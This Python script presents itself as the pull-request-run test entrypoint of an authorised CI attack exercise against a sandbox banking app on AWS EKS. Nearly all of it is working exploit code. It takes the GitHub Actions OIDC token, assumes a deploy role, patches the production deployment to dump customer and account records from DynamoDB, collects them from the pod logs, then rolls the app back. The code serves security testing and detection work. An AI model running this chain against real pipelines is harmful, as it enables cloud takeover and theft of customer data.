"""PR-editable test entrypoint for the D2 exercise — stands in for attacker-controlled code
that a pull request runs in CI.

On a non-PR run it only reports which AWS identity the job could obtain (harmless). On a pull
request it demonstrates the full impact in the sandbox: use the obtained deploy identity to
replace the running app with a container that reads the synthetic customer tables, print what it
read, then restore the app. Authorized exercise, invented records, nothing leaves the cluster.
"""

import json
import os
import subprocess
import time
import urllib.parse
import urllib.request
from datetime import UTC, datetime

import boto3
from botocore import UNSIGNED
from botocore.config import Config

MARKER = "original-harmless-probe"

# Runs inside the hijacked pod (which carries the app's data-reading identity). No single quotes:
# it is shell single-quoted below. Reads table names from the pod's own environment.
READER = (
    "import boto3,os,json;"
    'c=boto3.client("dynamodb",region_name=os.environ.get("AWS_REGION","us-east-1"));'
    'print("STOLEN CUSTOMER RECORDS:");'
    '[print(json.dumps(c.get_item(TableName=os.environ["ACCOUNTS_TABLE"],'
    'Key={"account_id":{"S":a}}).get("Item"))) for a in ("acct-alice","acct-bob")];'
    '[print(json.dumps(c.get_item(TableName=os.environ["CUSTOMERS_TABLE"],'
    'Key={"customer_id":{"S":u}}).get("Item"))) for u in ("cust-alice","cust-bob")];'
    'print("---END---")'
)


def web_identity_token() -> str:
    parsed = urllib.parse.urlparse(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"])
    query = urllib.parse.parse_qsl(parsed.query) + [("audience", "sts.amazonaws.com")]
    url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
    request = urllib.request.Request(url, headers={
        "Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"],
    })
    with urllib.request.urlopen(request, timeout=20) as response:
        return json.load(response)["value"]


def obtain_identity(region: str) -> dict:
    """The credential grab the detector watches for. Fails with AccessDenied once trust is fixed."""
    sts = boto3.client("sts", region_name=region, config=Config(signature_version=UNSIGNED))
    return sts.assume_role_with_web_identity(
        RoleArn=os.environ["D2_DEMO_ROLE_ARN"],
        RoleSessionName=os.environ.get("D2_SESSION_NAME", "release-looking-demo"),
        WebIdentityToken=web_identity_token(), DurationSeconds=900,
    )["Credentials"]


def exploit(credentials: dict, region: str):
    """Act as the obtained deploy identity: reach the cluster, replace the app, read, restore."""
    env = {**os.environ, "AWS_ACCESS_KEY_ID": credentials["AccessKeyId"],
           "AWS_SECRET_ACCESS_KEY": credentials["SecretAccessKey"],
           "AWS_SESSION_TOKEN": credentials["SessionToken"],
           "AWS_REGION": region, "AWS_DEFAULT_REGION": region}
    cluster = os.environ["EKS_CLUSTER_NAME"]
    subprocess.run(["aws", "eks", "update-kubeconfig", "--name", cluster, "--region", region],
                   env=env, check=True)
    patch = {"spec": {"template": {"spec": {"containers": [{
        "name": "api", "command": ["sh", "-c", f"python -c '{READER}'; sleep 3600"],
        "livenessProbe": None, "readinessProbe": None, "startupProbe": None,
    }]}}}}
    subprocess.run(["kubectl", "-n", "mybank", "patch", "deployment", "mybank-api",
                    "--type", "strategic", "-p", json.dumps(patch)], env=env, check=True)
    print("Replaced mybank-api with a reader of the customer tables; waiting for it to run...",
          flush=True)
    records = ""
    for _ in range(18):
        time.sleep(10)
        result = subprocess.run(
            ["kubectl", "-n", "mybank", "logs", "-l", "app.kubernetes.io/name=mybank-api",
             "--tail=20"], env=env, capture_output=True, text=True)
        if "STOLEN CUSTOMER RECORDS" in result.stdout:
            records = result.stdout
            break
    print(records or "(no records captured yet)", flush=True)
    subprocess.run(["kubectl", "-n", "mybank", "rollout", "undo", "deployment/mybank-api"],
                   env=env, check=False)
    subprocess.run(["kubectl", "-n", "mybank", "rollout", "status", "deployment/mybank-api",
                    "--timeout=180s"], env=env, check=False)
    print("Restored the legitimate app.", flush=True)


def main():
    region = os.environ.get("AWS_REGION", "us-east-1")
    credentials = obtain_identity(region)
    identity = boto3.client(
        "sts", region_name=region, aws_access_key_id=credentials["AccessKeyId"],
        aws_secret_access_key=credentials["SecretAccessKey"],
        aws_session_token=credentials["SessionToken"]).get_caller_identity()
    print(json.dumps({"marker": MARKER, "obtained_identity": identity["Arn"],
                      "attempt_utc": datetime.now(UTC).isoformat()}), flush=True)
    if os.environ.get("GITHUB_EVENT_NAME") == "pull_request":
        print("PR context: demonstrating impact — replace the app and read customer data.",
              flush=True)
        exploit(credentials, region)
    else:
        print("Non-PR context: identity proof only; not modifying the app.", flush=True)


if __name__ == "__main__":
    main()
